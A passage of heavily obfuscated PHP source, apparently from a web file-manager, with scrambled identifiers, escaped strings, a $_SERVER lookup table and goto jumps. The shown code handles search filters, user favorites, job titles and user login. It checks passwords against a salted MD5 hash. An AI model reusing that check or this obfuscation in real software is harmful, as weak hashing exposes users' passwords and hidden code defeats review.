$™˜òåÂ¯) { $ùôùŒÌ[$²ŸÈ§´±[521] . $óø„î¼¯] = $™˜òåÂ¯; } foreach ($±ŒŞ¸¨€ as $Õâ­”ç) { $ùôùŒÌ[] = array($²ŸÈ§´±[526] => $Õâ­”ç, $²ŸÈ§´±[1094] => $²ŸÈ§´±[2102], array($²ŸÈ§´±[2278] => $Õâ­”ç, $²ŸÈ§´±[2279] => array($²ŸÈ§´±[7], array($²ŸÈ§´±[548], $²ŸÈ§´±[547])))); } $this->join($¡±ú»ë); $‚¬Õ¶ò = $ùôùŒÌ; } private function _parseSearchWhere($›‚ûã²ğ) { $¾·ÚÈÈ =& $_SERVER[É¨™èà]; $Úò¥‚„ = array(); if (isset($›‚ûã²ğ[$¾·ÚÈÈ[851]]) && $›‚ûã²ğ[$¾·ÚÈÈ[851]]) { $Úò¥‚„[$¾·ÚÈÈ[88]] = array($¾·ÚÈÈ[2280], $›‚ûã²ğ[$¾·ÚÈÈ[851]]); } if (isset($›‚ûã²ğ[$¾·ÚÈÈ[852]]) && $›‚ûã²ğ[$¾·ÚÈÈ[852]]) { $ë†Ÿª¨æ = array($¾·ÚÈÈ[2281], $›‚ûã²ğ[$¾·ÚÈÈ[852]]); if ($Úò¥‚„[$¾·ÚÈÈ[88]]) { $Úò¥‚„[$¾·ÚÈÈ[88]] = array($Úò¥‚„[$¾·ÚÈÈ[88]], $ë†Ÿª¨æ, $¾·ÚÈÈ[2282]); } else { $Úò¥‚„[$¾·ÚÈÈ[88]] = $ë†Ÿª¨æ; } } if (isset($›‚ûã²ğ[$¾·ÚÈÈ[2274]]) && $›‚ûã²ğ[$¾·ÚÈÈ[2274]] > 0) { $Úò¥‚„[$¾·ÚÈÈ[79]] = array($¾·ÚÈÈ[2280], $›‚ûã²ğ[$¾·ÚÈÈ[2274]]); } if (isset($›‚ûã²ğ[$¾·ÚÈÈ[2275]]) && $›‚ûã²ğ[$¾·ÚÈÈ[2275]]) { $ë†Ÿª¨æ = array($¾·ÚÈÈ[2281], $›‚ûã²ğ[$¾·ÚÈÈ[2275]]); if ($Úò¥‚„[$¾·ÚÈÈ[79]]) { $Úò¥‚„[$¾·ÚÈÈ[79]] = array($Úò¥‚„[$¾·ÚÈÈ[79]], $ë†Ÿª¨æ, $¾·ÚÈÈ[2282]); } else { $Úò¥‚„[$¾·ÚÈÈ[79]] = $ë†Ÿª¨æ; } } if (isset($›‚ûã²ğ[$¾·ÚÈÈ[677]]) && $›‚ûã²ğ[$¾·ÚÈÈ[677]]) { $Úò¥‚„[] = array($¾·ÚÈÈ[539] => $›‚ûã²ğ[$¾·ÚÈÈ[677]], $¾·ÚÈÈ[537] => $›‚ûã²ğ[$¾·ÚÈÈ[677]], $¾·ÚÈÈ[1094] => $¾·ÚÈÈ[2102]); } if (isset($›‚ûã²ğ[$¾·ÚÈÈ[496]]) && $›‚ûã²ğ[$¾·ÚÈÈ[496]]) { $’Õ£ü¢Ú = $›‚ûã²ğ[$¾·ÚÈÈ[496]]; if ($’Õ£ü¢Ú == $¾·ÚÈÈ[78]) { $Úò¥‚„[$¾·ÚÈÈ[495]] = 1; } else { if ($’Õ£ü¢Ú == $¾·ÚÈÈ[2283]) { $Úò¥‚„[$¾·ÚÈÈ[495]] = 0; } else { if ($’Õ£ü¢Ú) { $’Õ£ü¢Ú = is_array($’Õ£ü¢Ú) ? $’Õ£ü¢Ú : explode($¾·ÚÈÈ[50], $’Õ£ü¢Ú); $Úò¥‚„[$¾·ÚÈÈ[496]] = array($¾·ÚÈÈ[502], $’Õ£ü¢Ú); $Úò¥‚„[$¾·ÚÈÈ[495]] = 0; } } } } $this->_parseSearchParent($›‚ûã²ğ, $Úò¥‚„); if (isset($›‚ûã²ğ[$¾·ÚÈÈ[2098]]) && trim($›‚ûã²ğ[$¾·ÚÈÈ[2098]])) { $İ”ıí»„ = trim($›‚ûã²ğ[$¾·ÚÈÈ[2098]]); $üÉàê‘‚ = explode($¾·ÚÈÈ[53], $İ”ıí»„); if (strlen($İ”ıí»„) > 2 && (substr($İ”ıí»„, 0, 1) == $¾·ÚÈÈ[121] && substr($İ”ıí»„, -1) == $¾·ÚÈÈ[121]) || substr($İ”ıí»„, 0, 1) == $¾·ÚÈÈ[58] && substr($İ”ıí»„, -1) == $¾·ÚÈÈ[58]) { $İ”ıí»„ = substr($İ”ıí»„, 1, -1); $üÉàê‘‚ = array($İ”ıí»„); } $Úò¥‚„[$¾·ÚÈÈ[32]] = array(array($¾·ÚÈÈ[627], $¾·ÚÈÈ[2100] . $İ”ıí»„ . $¾·ÚÈÈ[2100])); if (count($üÉàê‘‚) > 1) { $Úò¥‚„[$¾·ÚÈÈ[32]] = array(); foreach ($üÉàê‘‚ as $ºûÅÌ¦) { if (!trim($ºûÅÌ¦)) { continue; } $Úò¥‚„[$¾·ÚÈÈ[32]][] = array($¾·ÚÈÈ[627], $¾·ÚÈÈ[2100] . trim($ºûÅÌ¦) . $¾·ÚÈÈ[2100]); } } } return $Úò¥‚„; } private function _parseSearchParent($ŸŠ¯¬¦, &$üîÎ –é) { $²ŠîÅäì =& $_SERVER[É¨™èà]; if (!isset($ŸŠ¯¬¦[$²ŠîÅäì[193]]) || !$ŸŠ¯¬¦[$²ŠîÅäì[193]]) { return; } $ŞóŞºÅ = $this->pathInfo($ŸŠ¯¬¦[$²ŠîÅäì[193]]); $èÄÕ±Ü = $ŞóŞºÅ[$²ŠîÅäì[193]] . $²ŠîÅäì[12] === $²ŠîÅäì[231]; $àÃúº¹ = $ŞóŞºÅ[$²ŠîÅäì[191]] == $²ŠîÅäì[590]; if ($ŞóŞºÅ[$²ŠîÅäì[606]] == $²ŠîÅäì[607]) { $ˆË°’É• = $this->sourceInfo($ŸŠ¯¬¦[$²ŠîÅäì[193]]); $ŞóŞºÅ[$²ŠîÅäì[596]] = $ˆË°’É•[$²ŠîÅäì[596]]; } $üîÎ –é[$²ŠîÅäì[667]] = array($²ŠîÅäì[627], $ŞóŞºÅ[$²ŠîÅäì[596]] . $ŸŠ¯¬¦[$²ŠîÅäì[193]] . $²ŠîÅäì[628]); $…ìª×û™ = isset($ŸŠ¯¬¦[$²ŠîÅäì[1959]]) && in_array($²ŠîÅäì[590], $ŸŠ¯¬¦[$²ŠîÅäì[1959]]); if (!$…ìª×û™ || !$àÃúº¹ || !$èÄÕ±Ü || !$ŞóŞºÅ[$²ŠîÅäì[497]]) { return; } if (!AuthModel::authCheckRoot($ŞóŞºÅ[$²ŠîÅäì[497]][$²ŠîÅäì[498]])) { return; } $‰İÆ¿¦é = $ŞóŞºÅ[$²ŠîÅäì[581]] . $²ŠîÅäì[12]; if ($‰İÆ¿¦é == $²ŠîÅäì[91]) { unset($üîÎ –é[$²ŠîÅäì[667]]); $üîÎ –é[$²ŠîÅäì[191]] = self::TYPE_GROUP; return; } $º¼äö = Model($²ŠîÅäì[597])->groupChildrenAll($‰İÆ¿¦é); $÷ÑØßØË = count($º¼äö); if ($÷ÑØßØË <= 1) { return; } $ê«øÔÅÊ = array($²ŠîÅäì[193] => 0, $²ŠîÅäì[191] => self::TYPE_GROUP, $²ŠîÅäì[581] => array($²ŠîÅäì[7], $º¼äö)); $³¼¯¡Ä€ = $this->field($²ŠîÅäì[2284])->where($ê«øÔÅÊ)->limit($÷ÑØßØË)->select(); $üîÎ –é[$²ŠîÅäì[667]] = array(); foreach ($³¼¯¡Ä€ as $ƒØ ºö) { $üîÎ –é[$²ŠîÅäì[667]][] = array($²ŠîÅäì[627], $²ŠîÅäì[605] . $ƒØ ºö[$²ŠîÅäì[194]] . $²ŠîÅäì[628]); } $üîÎ –é[$²ŠîÅäì[667]][] = $²ŠîÅäì[2102]; } } goto eíÒÂÃ…ƒ’; e¨ÁŞñãáº: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\141\166"; protected function cacheFunctionAlias($«ÆÃ°ÜŞ) { $Ã½ùÒÅÃ =& $_SERVER[É¨™èà]; return array($Ã½ùÒÅÃ[2115] => array(USER_ID, $Ã½ùÒÅÃ[2495])); } protected function listData() { $ö€™áœš =& $_SERVER[É¨™èà]; $ËÒ×ç° = array($ö€™áœš[1791] => USER_ID, $ö€™áœš[569] => 0); $İ¯”³âó = $ö€™áœš[2496]; $¢ñóë‹ = $this->field($İ¯”³âó)->where($ËÒ×ç°)->order($ö€™áœš[2497])->select(); return $¢ñóë‹ ? $¢ñóë‹ : array(); } protected function resetCache() { } protected function listView() { $˜³ú„ıÓ =& $_SERVER[É¨™èà]; $÷Ï¯È¦ = $this->listData(); $•±® = array_filter_by_field($÷Ï¯È¦, $˜³ú„ıÓ[33], $˜³ú„ıÓ[500]); $­±Êæœ = array_to_keyvalue($•±®, $˜³ú„ıÓ[12], $˜³ú„ıÓ[87]); if (!$­±Êæœ) { return $÷Ï¯È¦; } $êéÅ¬˜å = 2000; $Öì¡çéÏ = array($˜³ú„ıÓ[501] => array($˜³ú„ıÓ[502], $­±Êæœ)); $œÎîë = Model($˜³ú„ıÓ[921])->listSource($Öì¡çéÏ, $êéÅ¬˜å); $œÎîë = array_merge($œÎîë[$˜³ú„ıÓ[86]], $œÎîë[$˜³ú„ıÓ[85]]); $œÎîë = array_to_keyvalue($œÎîë, $˜³ú„ıÓ[194]); foreach ($÷Ï¯È¦ as $ı€óßò± => $¹Ç€¡÷¤) { $¥‚çƒì˜ = $œÎîë[$¹Ç€¡÷¤[$˜³ú„ıÓ[87]]]; $¥‚çƒì˜ = $¥‚çƒì˜ ? $¥‚çƒì˜ : array(); $÷Ï¯È¦[$ı€óßò±] = array_merge($¥‚çƒì˜, $¹Ç€¡÷¤); } return $÷Ï¯È¦; } protected function addFav($… şĞğÄ, $éÃ¼åÑç = '', $†íŠòãĞ = "\x73\157\x75\x72\x63\x65") { $ç¸ÓÛ¾ =& $_SERVER[É¨™èà]; $š“¥‹ü = array($ç¸ÓÛ¾[1791] => USER_ID, $ç¸ÓÛ¾[569] => 0, $ç¸ÓÛ¾[506] => $†íŠòãĞ, $ç¸ÓÛ¾[505] => $… şĞğÄ); if ($this->where($š“¥‹ü)->find()) { return !1; } $š“¥‹ü = array($ç¸ÓÛ¾[1791] => USER_ID, $ç¸ÓÛ¾[569] => 0); $é‚¾‡€Ä = $this->where($š“¥‹ü)->max($ç¸ÓÛ¾[2023]); if (!$é‚¾‡€Ä) { $é‚¾‡€Ä = 0; } if (!$éÃ¼åÑç && $†íŠòãĞ == $ç¸ÓÛ¾[500]) { $ØÎË«‘á = Model($ç¸ÓÛ¾[1448])->where(array($ç¸ÓÛ¾[501] => $… şĞğÄ))->find(); if (!$ØÎË«‘á) { return !1; } $éÃ¼åÑç = $ØÎË«‘á[$ç¸ÓÛ¾[32]]; } $éÃ¼åÑç = $this->getAutoName($éÃ¼åÑç); $‹ÕÛø‰š = array($ç¸ÓÛ¾[1791] => USER_ID, $ç¸ÓÛ¾[569] => 0, $ç¸ÓÛ¾[504] => $éÃ¼åÑç, $ç¸ÓÛ¾[505] => $… şĞğÄ, $ç¸ÓÛ¾[506] => $†íŠòãĞ, $ç¸ÓÛ¾[2003] => $é‚¾‡€Ä + 1); return $this->add($‹ÕÛø‰š); } protected function remove($¨¤§„³†) { $Ø€ÑÏıê =& $_SERVER[É¨™èà]; $±‰õšŒ‹ = array($Ø€ÑÏıê[1791] => USER_ID, $Ø€ÑÏıê[503] => $¨¤§„³†); return $this->where($±‰õšŒ‹)->delete(); } protected function removeByName($ã…Œ´¶ì) { $”´¯§æ =& $_SERVER[É¨™èà]; $ÈÂÑ½–¯ = array($”´¯§æ[1791] => USER_ID, $”´¯§æ[504] => $ã…Œ´¶ì, $”´¯§æ[569] => 0); return $this->where($ÈÂÑ½–¯)->delete(); } protected function rename($’¶«›¨ , $şâßÒ÷ù) { $Íª€í¢¹ =& $_SERVER[É¨™èà]; if ($’¶«›¨  == $şâßÒ÷ù) { return !1; } $ä±¼½•š = $this->getAutoName($şâßÒ÷ù); if ($şâßÒ÷ù != $ä±¼½•š) { return !1; } $ƒÂÊ„§ã = array($Íª€í¢¹[1791] => USER_ID, $Íª€í¢¹[569] => 0, $Íª€í¢¹[32] => $’¶«›¨ ); return $this->where($ƒÂÊ„§ã)->save(array($Íª€í¢¹[32] => $şâßÒ÷ù)); } protected function resetSort($Ş—õŒõß) { $ğ™ëÄ³Ş =& $_SERVER[É¨™èà]; $Ş—õŒõß = is_array($Ş—õŒõß) ? $Ş—õŒõß : array(); $ùšÏĞÈ˜ = array($ğ™ëÄ³Ş[1791] => USER_ID); for ($¯ñ¾Â¡¥ = 0; $¯ñ¾Â¡¥ < count($Ş—õŒõß); $¯ñ¾Â¡¥++) { $ùšÏĞÈ˜[$ğ™ëÄ³Ş[503]] = $Ş—õŒõß[$¯ñ¾Â¡¥]; $this->where($ùšÏĞÈ˜)->save(array($ğ™ëÄ³Ş[2003] => $¯ñ¾Â¡¥ + 1)); } return !0; } protected function moveTop($ßâÜ…ª½) { $¼¿™×ÆŞ =& $_SERVER[É¨™èà]; $€Ó¼ƒÙ© = array($¼¿™×ÆŞ[1791] => USER_ID, $¼¿™×ÆŞ[569] => 0); $ó×­ÌĞÕ = $this->where($€Ó¼ƒÙ©)->where(array($¼¿™×ÆŞ[32] => $ßâÜ…ª½))->find(); if (!$ó×­ÌĞÕ) { return; } $ÎÂ¼—¹’ = $this->field($¼¿™×ÆŞ[485])->where($€Ó¼ƒÙ©)->order($¼¿™×ÆŞ[2497])->select(); $ÎÂ¼—¹’ = array_to_keyvalue($ÎÂ¼—¹’, $¼¿™×ÆŞ[12], $¼¿™×ÆŞ[485]); $Üê˜İ¥ = $ÎÂ¼—¹’; $ÎÂ¼—¹’ = array_remove_value($ÎÂ¼—¹’, $ó×­ÌĞÕ[$¼¿™×ÆŞ[485]]); array_unshift($ÎÂ¼—¹’, $ó×­ÌĞÕ[$¼¿™×ÆŞ[485]]); return $this->resetSort($ÎÂ¼—¹’); } protected function moveBottom($Íµ°×§ü) { $ûåÍËê¹ =& $_SERVER[É¨™èà]; $ƒ°šİ« = array($ûåÍËê¹[1791] => USER_ID, $ûåÍËê¹[569] => 0); $¥Øí„³¥ = $this->where($ƒ°šİ«)->max($ûåÍËê¹[2023]); $¬‚«ıùå = array($ûåÍËê¹[2023] => $¥Øí„³¥ + 1); return $this->where($ƒ°šİ«)->where(array($ûåÍËê¹[32] => $Íµ°×§ü))->save($¬‚«ıùå); } private function getAutoName($óÔ•›±) { $¿¸Æª¬„ =& $_SERVER[É¨™èà]; $®­Ó†è = array($¿¸Æª¬„[1791] => USER_ID, $¿¸Æª¬„[569] => 0); $¸µ¾­ª÷ = $this->field($¿¸Æª¬„[32])->where($®­Ó†è)->select(); $¸µ¾­ª÷ = array_to_keyvalue($¸µ¾­ª÷, $¿¸Æª¬„[12], $¿¸Æª¬„[32]); if (!$¸µ¾­ª÷ || !in_array($óÔ•›±, $¸µ¾­ª÷)) { return $óÔ•›±; } for ($Ì‰¡½‹¢ = 0; $Ì‰¡½‹¢ < count($¸µ¾­ª÷); $Ì‰¡½‹¢++) { if (!in_array($óÔ•›± . "\x28{$Ì‰¡½‹¢}\51", $¸µ¾­ª÷)) { return $óÔ•›± . "\x28{$Ì‰¡½‹¢}\x29"; } } return $óÔ•›± . "\50{$Ì‰¡½‹¢}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\x6a\x6f\x62\114\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\144\x65\163\143", "\x73\x6f\162\x74"); const JOB_KEY = "\163\145\154\x66\x4a\x6f\x62\x4c\151\x73\x74"; public function listData($ì¦ÅÒúß = false, $ßÏ¨†Éš = "\x73\x6f\x72\164", $æ«µ‘÷ = false) { return parent::listData($ì¦ÅÒúß, $ßÏ¨†Éš, $æ«µ‘÷); } public function remove($ÊšÇØÃí) { return parent::remove($ÊšÇØÃí); } public function add($—‡¦Ëóà) { $ÜĞ†¢Çó =& $_SERVER[É¨™èà]; if ($this->findByName($—‡¦Ëóà[$ÜĞ†¢Çó[32]])) { return !1; } $—‡¦Ëóà[$ÜĞ†¢Çó[2023]] = $this->getSort(); return parent::insert($—‡¦Ëóà); } private function getSort() { $‰¾üÖÍ¾ =& $_SERVER[É¨™èà]; $ñ¢³¬»€ = parent::listData(); $ú”ÏºÙ = array_to_keyvalue($ñ¢³¬»€, $‰¾üÖÍ¾[12], $‰¾üÖÍ¾[2023]); return empty($ú”ÏºÙ) ? 0 : max($ú”ÏºÙ) + 1; } public function update($£ï² €ê, $‘ÆéŠ¶á) { $¨ù²àÓî =& $_SERVER[É¨™èà]; $Ì¡ÀÒÊ = parent::listData($£ï² €ê); $üÙµßò = $this->findByName($‘ÆéŠ¶á[$¨ù²àÓî[32]]); if (!$Ì¡ÀÒÊ || $üÙµßò && $üÙµßò[$¨ù²àÓî[485]] != $Ì¡ÀÒÊ[$¨ù²àÓî[485]]) { return !1; } return parent::update($£ï² €ê, $‘ÆéŠ¶á); } public function setUserJob($É«Ò˜€Ò, $¼ûÙ±´‡) { $ê·½©£¹ =& $_SERVER[É¨™èà]; if (!is_array($¼ûÙ±´‡)) { $¼ûÙ±´‡ = array($¼ûÙ±´‡); } $¹ ûÉôİ = parent::listData(); $»½œøë = array_to_keyvalue($¹ ûÉôİ, $ê·½©£¹[32]); $¿äÓÜ×„ = $ê·½©£¹[316]; foreach ($¼ûÙ±´‡ as $ìÈÛÛÛ) { if ($»½œøë[$ìÈÛÛÛ]) { $¿äÓÜ×„ .= $»½œøë[$ìÈÛÛÛ][$ê·½©£¹[485]] . $ê·½©£¹[50]; } else { $ÅºÕ®¯Ø = $this->add($ìÈÛÛÛ); $¿äÓÜ×„ .= $ÅºÕ®¯Ø . $ê·½©£¹[50]; } } $¿äÓÜ×„ = rtrim($¿äÓÜ×„, $ê·½©£¹[50]); Model($ê·½©£¹[609])->metaSet($É«Ò˜€Ò, self::JOB_KEY, $¿äÓÜ×„); } public function getUserJob($–Òış­) { $Õí¨Á¥€ = Model($_SERVER[É¨™èà][609])->metaGet($–Òış­); return $this->getUserJobInfo($Õí¨Á¥€[self::JOB_KEY]); } public function getUserJobInfo($ÆŒ‡¦½) { $´ƒŞ†ä =& $_SERVER[É¨™èà]; $Å³½º© = explode($´ƒŞ†ä[50], $ÆŒ‡¦½); $˜Ú’…¥ = parent::listData(); $˜Ú’…¥ = array_remove_key($˜Ú’…¥, $´ƒŞ†ä[234]); $ÙËÆÌ’ = array(); foreach ($Å³½º© as $õÚ÷’Ò½) { if (isset($˜Ú’…¥[$õÚ÷’Ò½])) { $ÙËÆÌ’[] = $˜Ú’…¥[$õÚ÷’Ò½]; } } return $ÙËÆÌ’; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\x74\141\142\154\145\x4e\141\155\145" => "\x75\x73\145\x72\137\x6d\145\x74\141", "\x6d\145\x74\141\106\151\145\154\x64" => "\165\163\145\162\111\104"); protected $simpleField = "\x75\x73\x65\162\111\x44\x2c\x6e\151\143\x6b\x4e\141\x6d\145\54\x6e\x61\x6d\x65\x2c\141\166\141\x74\x61\162\x2c\163\145\170\x2c\163\164\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($±ƒÖÓ¢) { $€›¿á˜½ =& $_SERVER[É¨™èà]; $ëú¦æ·Å = $€›¿á˜½[2498]; return array($€›¿á˜½[2081] => array($±ƒÖÓ¢[0], $ëú¦æ·Å), $€›¿á˜½[2083] => array($±ƒÖÓ¢[0], $ëú¦æ·Å), $€›¿á˜½[2499] => array($±ƒÖÓ¢[0], $ëú¦æ·Å)); } protected function getInfo($ó²°Èçñ, $òĞÖ‰¢´ = false) { $‹„’›ÇÒ = $this->getInfoSimple($ó²°Èçñ); if (!is_array($‹„’›ÇÒ)) { return array(); } if ($òĞÖ‰¢´) { return $this->_getInfoApply($‹„’›ÇÒ); } return $this->cacheFunctionGet($_SERVER[É¨™èà][2085], $ó²°Èçñ); } protected function getInfoFull($‰õÃĞÄä, $¶úšµŠê = false) { $·ÌâÏÔÏ = $this->getInfoSimple($‰õÃĞÄä); if (!is_array($·ÌâÏÔÏ)) { return array(); } if ($¶úšµŠê) { return $this->_getInfoApply($·ÌâÏÔÏ, !0); } return $this->cacheFunctionGet($_SERVER[É¨™èà][2500], $‰õÃĞÄä); } private function _getInfoApply($Ô¥÷¼¾ß, $Å²˜¡© = false) { $™“„ù¿€ =& $_SERVER[É¨™èà]; if (!$Ô¥÷¼¾ß) { return $Ô¥÷¼¾ß; } $òïîüĞ½ = md5($™“„ù¿€[2501] . $Ô¥÷¼¾ß[$™“„ù¿€[983]] . $™“„ù¿€[2502] . $Ô¥÷¼¾ß[$™“„ù¿€[32]]); $Ô¥÷¼¾ß = $this->_listDataApplyItem($Ô¥÷¼¾ß); $ƒéÈé¾ø = Model($™“„ù¿€[1448])->metaGet($Ô¥÷¼¾ß[$™“„ù¿€[90]][$™“„ù¿€[194]]); $Ô¥÷¼¾ß[$™“„ù¿€[2503]] = $òïîüĞ½; $Ô¥÷¼¾ß[$™“„ù¿€[90]][$™“„ù¿€[2286]] = isset($ƒéÈé¾ø[$™“„ù¿€[2287]]) ? $ƒéÈé¾ø[$™“„ù¿€[2287]] : null; if ($Å²˜¡©) { $Ô¥÷¼¾ß[$™“„ù¿€[551]] = $this->metaGet($Ô¥÷¼¾ß[$™“„ù¿€[1800]]); } return $Ô¥÷¼¾ß; } protected function getInfoSimple($‡‰ßì°, $šˆÎµ‡” = false) { $¾‘üÙ¹ã =& $_SERVER[É¨™èà]; if (!$‡‰ßì°) { return array(); } if ($šˆÎµ‡”) { $ÏŸôç‘É = $this->where(array($¾‘üÙ¹ã[1800] => intval($‡‰ßì°)))->find(); if (!is_array($ÏŸôç‘É)) { return array(); } $ÏŸôç‘É[$¾‘üÙ¹ã[2504]] = Action($¾‘üÙ¹ã[2505])->parseUrl($ÏŸôç‘É[$¾‘üÙ¹ã[2504]]); return $ÏŸôç‘É; } return $this->cacheFunctionGet($¾‘üÙ¹ã[2086], $‡‰ßì°); } protected function getInfoSimpleOuter($İ¢‰•é) { $¸¤¤ï·« =& $_SERVER[É¨™èà]; if (!$İ¢‰•é || $İ¢‰•é == 0) { return array($¸¤¤ï·«[1800] => $¸¤¤ï·«[231], $¸¤¤ï·«[32] => $¸¤¤ï·«[176] . LNG($¸¤¤ï·«[2506]) . $¸¤¤ï·«[178], $¸¤¤ï·«[2504] => STATIC_PATH . $¸¤¤ï·«[2507]); } $™™ŸÍ‹ú = $this->cacheFunctionGet($¸¤¤ï·«[2086], $İ¢‰•é); $´ƒ’×® = array_field_key($™™ŸÍ‹ú, explode($¸¤¤ï·«[50], $this->simpleField)); if (!$´ƒ’×®) { return array($¸¤¤ï·«[1800] => $¸¤¤ï·«[1293], $¸¤¤ï·«[32] => $¸¤¤ï·«[176] . LNG($¸¤¤ï·«[2508]) . $¸¤¤ï·«[178], $¸¤¤ï·«[2504] => STATIC_PATH . $¸¤¤ï·«[2509]); } $´ƒ’×®[$¸¤¤ï·«[2504]] = Action($¸¤¤ï·«[2505])->parseUrl($´ƒ’×®[$¸¤¤ï·«[2504]]); return $´ƒ’×®; } protected function groupUser($¹”ÉæÓş) { } public static function errorLang($Ì‰¹¶û±) { $…´ç‡°¹ =& $_SERVER[É¨™èà]; $µ‰é¬î€ = array(self::ERROR_USER_NOT_EXISTS => $…´ç‡°¹[2510], self::ERROR_USER_PASSWORD_ERROR => $…´ç‡°¹[2511], self::ERROR_USER_EXIST_NAME => $…´ç‡°¹[2512], self::ERROR_USER_EXIST_PHONE => $…´ç‡°¹[2513], self::ERROR_USER_EXIST_EMAIL => $…´ç‡°¹[2514], self::ERROR_USER_LOGIN_LOCK => $…´ç‡°¹[2515], self::ERROR_IP_NOT_ALLOW => $…´ç‡°¹[2516], self::ERROR_USER_EXIST_NICKNAME => $…´ç‡°¹[2517]); $·ğÈŞ = LNG($µ‰é¬î€[$Ì‰¹¶û±]); if ($Ì‰¹¶û± == self::ERROR_USER_LOGIN_LOCK) { $æïİ³´Î = (int) Model($…´ç‡°¹[1404])->get($…´ç‡°¹[2518]); if ($æïİ³´Î > 60) { $·ğÈŞ = str_replace($…´ç‡°¹[91], ceil($æïİ³´Î / 60), $·ğÈŞ); } } return $·ğÈŞ; } protected function metaSet($ûÚØÉİØ, $»àƒî©É = null, $›°¸‹°” = null) { $this->clearCache($ûÚØÉİØ); return parent::metaSet($ûÚØÉİØ, $»àƒî©É, $›°¸‹°”); } public function getInfoByMeta($Ÿş”‰, $áï•éò) { $àÉğçş— =& $_SERVER[É¨™èà]; $Úåâßå = Model($àÉğçş—[2519])->where(array($àÉğçş—[97] => $Ÿş”‰, $àÉğçş—[461] => $áï•éò))->find(); if ($Úåâßå) { return $this->getInfo($Úåâßå[$àÉğçş—[1800]]); } return !1; } public function userLoginCheck($é¸‡åĞ˜, $±¡‚ Æ‹, $”£Œûç¤ = false) { $æÔ®ˆ¬ë =& $_SERVER[É¨™èà]; $‡Ú²„ú¾ = $this->userLoginFind($é¸‡åĞ˜); if (!$‡Ú²„ú¾) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($‡Ú²„ú¾[$æÔ®ˆ¬ë[1800]], $±¡‚ Æ‹)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $”£Œûç¤ ? $this->getInfoFull($‡Ú²„ú¾[$æÔ®ˆ¬ë[1800]]) : $this->getInfo($‡Ú²„ú¾[$æÔ®ˆ¬ë[1800]]); } public function userLoginFind($ƒÃëİ¾¡) { $üí˜Õ»· =& $_SERVER[É¨™èà]; $º¤·¡ş = array($üí˜Õ»·[32] => $ƒÃëİ¾¡, $üí˜Õ»·[2299] => $ƒÃëİ¾¡, $üí˜Õ»·[391] => $ƒÃëİ¾¡, $üí˜Õ»·[2520] => $ƒÃëİ¾¡, $üí˜Õ»·[1094] => $üí˜Õ»·[1096]); if ($this->nickNameRpt()) { unset($º¤·¡ş[$üí˜Õ»·[2299]]); } return $this->where($º¤·¡ş)->find(); } public function clearCache($Ê‡õÃ™”) { $ê‰êõœí =& $_SERVER[É¨™èà]; $this->cacheFunctionClear($ê‰êõœí[2085], $Ê‡õÃ™”); $this->cacheFunctionClear($ê‰êõœí[2086], $Ê‡õÃ™”); $this->cacheFunctionClear($ê‰êõœí[2500], $Ê‡õÃ™”); } public function userPasswordCheck($óüù’Ş¡, $«ô®ü‚Ğ) { $±õ“ë¬Õ =& $_SERVER[É¨™èà]; $»¢²ç”ö = $this->where(array($±õ“ë¬Õ[1800] => intval($óüù’Ş¡)))->find(); $æ´ŠØê÷ = $this->metaGet($óüù’Ş¡); $‘ÊïªÍ = isset($æ´ŠØê÷[$±õ“ë¬Õ[2521]]) ? $æ´ŠØê÷[$±õ“ë¬Õ[2521]] : $±õ“ë¬Õ[12]; if (md5($‘ÊïªÍ . trim($«ô®ü‚Ğ)) !== $»¢²ç”ö[$±õ“ë¬Õ[983]]) { return !1; } return !0; } public function userAdd($·÷ÆöÌ©) { $ş•’–ó… =& $_SERVER[É¨™èà]; $¼‚ö‰íÃ = array($ş•’–ó…[504] => $·÷ÆöÌ©[$ş•’–ó…[32]], $ş•’–ó…[2522] => $·÷ÆöÌ©[$ş•’–ó…[2210]], $ş•’–ó…[2523] => isset($·÷ÆöÌ©[$ş•’–ó…[391]]) ? $·÷ÆöÌ©[$ş•’–ó…[391]] : $ş•’–ó…[12], $ş•’–ó…[2524] => isset($·÷ÆöÌ©[$ş•’–ó…[2520]]) ? $·÷ÆöÌ©[$ş•’–ó…[2520]] : $ş•’–ó…[12], $ş•’–ó…[2525] => isset($·÷ÆöÌ©[$ş•’–ó…[2299]]) ? $·÷ÆöÌ©[$ş•’–ó…[2299]] : $·÷ÆöÌ©[$ş•’–ó…[32]], $ş•’–ó…[2526] => isset($·÷ÆöÌ©[$ş•’–ó…[2504]]) ? $·÷ÆöÌ©[$ş•’–ó…[2504]] : $ş•’–ó…[12], $ş•’–ó…[2527] => isset($·÷ÆöÌ©[$ş•’–ó…[2528]]) ? $·÷ÆöÌ©[$ş•’–ó…[2528]] : 1, $ş•’–ó…[2529] => $·÷ÆöÌ©[$ş•’–ó…[983]], $ş•’–ó…[2087] => isset($·÷ÆöÌ©[$ş•’–ó…[1986]]) ? $·÷ÆöÌ©[$ş•’–ó…[1986]] : 1024 * 1024 * 20, $ş•’–ó…[2088] => 0, $ş•’–ó…[2530] => 0, $ş•’–ó…[2132] => isset($·÷ÆöÌ©[$ş•’–ó…[840]]) ? $·÷ÆöÌ©[$ş•’–ó…[840]] : 1); if (!empty($·÷ÆöÌ©[$ş•’–ó…[1800]])) { $¼‚ö‰íÃ[$ş•’–ó…[1800]] = $·÷ÆöÌ©[$ş•’–ó…[1800]]; } $ˆé«€¿Š = $this->_checkExist($·÷ÆöÌ©); if ($ˆé«€¿Š !== !0) { return $ˆé«€¿Š; } if (!empty($¼‚ö‰íÃ[$ş•’–ó…[2504]]) && strlen($¼‚ö‰íÃ[$ş•’–ó…[2504]]) > 255) { $¼‚ö‰íÃ[$ş•’–ó…[2504]] = $ş•’–ó…[12]; } $Ôˆ¹ ôö = $this->add($¼‚ö‰íÃ); $ì÷ÖÏÜ‰ = array($ş•’–ó…[2529] => $¼‚ö‰íÃ[$ş•’–ó…[983]], $ş•’–ó…[2525] => 